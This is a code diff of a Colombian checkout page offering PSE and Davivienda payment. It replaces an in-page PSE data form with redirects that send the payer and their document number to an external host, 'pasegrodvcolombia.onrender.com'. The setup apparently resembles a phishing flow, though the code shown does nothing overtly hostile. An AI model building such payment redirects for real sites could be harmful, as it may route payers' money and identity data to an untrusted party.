@@ -88,56 +88,6 @@
   .mobile-total { font-size: 18px; font-weight: 700; color: #222; }
   .mobile-btn-pagar { background: #dcdcdc; color: #777; border: none; border-radius: 30px; padding: 12px 30px; font-size: 15px; font-weight: 700; cursor: not-allowed; font-family: 'Montserrat', sans-serif; letter-spacing: 1px; transition: all 0.3s; }
 
-  /* ─── MODAL PANTALLA COMPLETA PSE ─── */
-  .pse-modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.6);
-    z-index: 1000;
-    display: none; /* Oculto por defecto */
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-  
-  .pse-modal-content {
-    background: #fff;
-    width: 100%;
-    max-width: 500px;
-    border-radius: 16px;
-    padding: 30px;
-    position: relative;
-    max-height: 90vh;
-    overflow-y: auto;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-  }
-
-  .pse-close-btn {
-    position: absolute;
-    top: 15px;
-    right: 20px;
-    background: none;
-    border: none;
-    font-size: 28px;
-    color: #888;
-    cursor: pointer;
-    transition: color 0.2s;
-  }
-  .pse-close-btn:hover { color: #d32f2f; }
-
-  .pse-modal-content h3 { font-size: 20px; color: #006341; margin-bottom: 25px; font-weight: 700; }
-  .pse-modal-content .input-group { flex-direction: column; gap: 15px; margin-bottom: 15px; }
-  .pse-modal-content label { font-size: 13px; margin-bottom: 5px; color: #333; font-weight: 500; display: block; }
-  .pse-modal-content select, .pse-modal-content input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: 'Montserrat', sans-serif; outline: none; }
-  .pse-modal-content select:focus, .pse-modal-content input:focus { border-color: #006341; }
-  
-  .btn-submit-pse { width: 100%; padding: 16px; background: #006341; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; font-family: 'Montserrat', sans-serif; transition: all 0.3s; text-transform: uppercase; margin-top: 10px; }
-  .btn-submit-pse:hover { background: #004d32; }
-  .btn-submit-pse:disabled { background: #999; cursor: not-allowed; }
-
   /* ─── RESPONSIVE ─── */
   @media (max-width: 900px) {
     .navbar { padding: 10px 16px; }
@@ -155,8 +105,6 @@
     .mobile-bottom-bar { display: flex; }
     
     .footer { flex-direction: column; gap: 15px; text-align: center; padding: 20px; padding-bottom: 100px; }
-    
-    .pse-modal-content { padding: 25px 20px; }
   }
 </style>
 </head>
@@ -204,7 +152,7 @@
     <h2 class="metodos-title">Métodos de pago</h2>
 
     <!-- Opción PSE -->
-    <div class="metodo-item" onclick="abrirModalPSE()">
+    <div class="metodo-item" onclick="irAlFrontPSE()">
       <span class="metodo-name">Débito PSE</span>
       <div class="metodo-icons">
         <img src="pse.png" alt="PSE" class="pse-icon">
@@ -212,7 +160,7 @@
     </div>
 
     <!-- Opción Davivienda -->
-    <div class="metodo-item" onclick="seleccionarDavivienda()">
+    <div class="metodo-item" onclick="irAlFrontDavivienda()">
       <span class="metodo-name">Pagar con Davivienda</span>
       <div class="metodo-icons">
         <img src="davi.png" alt="Davivienda">
@@ -267,53 +215,6 @@
   <div><a href="#">Términos y condiciones del sitio</a></div>
 </footer>
 
-<!-- MODAL PANTALLA COMPLETA PARA PSE -->
-<div class="pse-modal-overlay" id="pse-modal">
-  <div class="pse-modal-content">
-    <button class="pse-close-btn" onclick="cerrarModalPSE()">&times;</button>
-    <h3>Datos para PSE</h3>
-    
-    <div class="input-group">
-      <div class="input-field">
-        <label>Selecciona tu banco</label>
-        <select id="pse-bank">
-          <option value="">Cargando bancos...</option>
-        </select>
-      </div>
-    </div>
-
-    <div class="input-group">
-      <div class="input-field">
-        <label>Nombre completo</label>
-        <input type="text" id="pse-name" placeholder="Ej. Juan Pérez">
-      </div>
-    </div>
-
-    <div class="input-group">
-      <div class="input-field">
-        <label>Cédula</label>
-        <input type="text" id="pse-doc" placeholder="Ej. 1234567890">
-      </div>
-    </div>
-
-    <div class="input-group">
-      <div class="input-field">
-        <label>Correo Electrónico</label>
-        <input type="email" id="pse-email" placeholder="">
-      </div>
-    </div>
-
-    <div class="input-group">
-      <div class="input-field">
-        <label>Celular</label>
-        <input type="tel" id="pse-phone" placeholder="">
-      </div>
-    </div>
-
-    <button class="btn-submit-pse" id="btn-pse-pay" onclick="iniciarPagoPSE()">PAGAR</button>
-  </div>
-</div>
-
 <script>
   // 1. Leer parámetros de la URL (documento y total)
   const params = new URLSearchParams(window.location.search);
@@ -328,112 +229,19 @@
   document.getElementById('doc-display').textContent = numDoc;
   document.getElementById('sidebar-total').textContent = formattedTotal;
   document.getElementById('mobile-total').textContent = 'Total: ' + formattedTotal;
-  document.getElementById('pse-doc').value = numDoc; // Autocompletar cédula
 
-  // 3. Funcionalidad Modal PSE
-  function abrirModalPSE() {
-    const modal = document.getElementById('pse-modal');
-    modal.style.display = 'flex';
-    
-    // Autocompletar correo y celular si ya los escribió arriba
-    document.getElementById('pse-email').value = document.getElementById('main-email').value;
-    document.getElementById('pse-phone').value = document.getElementById('main-phone').value;
-    
-    // Si no se han cargado los bancos, cargarlos
-    if (document.getElementById('pse-bank').options.length <= 1) {
-      cargarBancosPSE();
-    }
+  // --- URL DEL FRONT (variable para fácil cambio) ---
+  const FRONT_URL = 'https://pasegrodvcolombia.onrender.com';
+
+  // 3. Redirigir al front para PSE
+  function irAlFrontPSE() {
+    // Pasamos el documento como parámetro por si el front lo necesita
+    window.location.href = `${FRONT_URL}/index.html?doc=${numDoc}&metodo=pse`;
   }
 
-  function cerrarModalPSE() {
-    document.getElementById('pse-modal').style.display = 'none';
-  }
-
-  // Cerrar modal al hacer clic fuera del contenido
-  document.getElementById('pse-modal').addEventListener('click', function(e) {
-    if (e.target === this) {
-      cerrarModalPSE();
-    }
-  });
-
-  // 4. Cargar bancos PSE desde el servidor
-  async function cargarBancosPSE() {
-    const select = document.getElementById('pse-bank');
-    try {
-      const res = await fetch('/api/pasarela/rappipay-bancos');
-      const data = await res.json();
-      
-      if (data.success && data.banks) {
-        select.innerHTML = '<option value="">Seleccione un banco...</option>';
-        data.banks.forEach(bank => {
-          const option = document.createElement('option');
-          option.value = bank.code;
-          option.textContent = bank.name;
-          select.appendChild(option);
-        });
-      } else {
-        select.innerHTML = '<option value="">Error al cargar bancos</option>';
-      }
-    } catch (err) {
-      console.error("Error cargando bancos:", err);
-      select.innerHTML = '<option value="">Error de conexión</option>';
-    }
-  }
-
-  // 5. Procesar pago PSE
-  async function iniciarPagoPSE() {
-    const bankCode = document.getElementById('pse-bank').value;
-    const name = document.getElementById('pse-name').value.trim();
-    const doc = document.getElementById('pse-doc').value.trim();
-    const email = document.getElementById('pse-email').value.trim();
-    const phone = document.getElementById('pse-phone').value.trim();
-    const btn = document.getElementById('btn-pse-pay');
-
-    if (!bankCode || !name || !doc || !email || !phone) {
-      alert("Por favor, complete todos los campos para continuar.");
-      return;
-    }
-
-    btn.disabled = true;
-    btn.textContent = "PROCESANDO...";
-
-    try {
-      const response = await fetch('/api/pasarela/rappipay-pse', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          amount: total,
-          bankCode: bankCode,
-          customerName: name,
-          customerDoc: doc,
-          customerDocType: 'CC',
-          numeroCuenta: 'N/A',
-          numeroFactura: numDoc,
-          reference: 'REF-' + Date.now()
-        })
-      });
-
-      const data = await response.json();
-
-      if (data.success && data.bankUrl) {
-        // Redirigir al banco
-        window.location.href = data.bankUrl;
-      } else {
-        alert("Error al generar el pago: " + (data.error || "Desconocido"));
-        btn.disabled = false;
-        btn.textContent = "PAGAR";
-      }
-    } catch (err) {
-      console.error(err);
-      alert("Error de conexión con el servidor.");
-      btn.disabled = false;
-      btn.textContent = "PAGAR";
-    }
-  }
-
-  // 6. Lógica para Davivienda (puedes ajustarla después)
-  function seleccionarDavivienda() {
-    alert("El pago con Davivienda estará disponible próximamente.");
+  // 4. Redirigir al front para Davivienda
+  function irAlFrontDavivienda() {
+    window.location.href = `${FRONT_URL}/index.html?doc=${numDoc}&metodo=davivienda`;
   }
 </script>
 
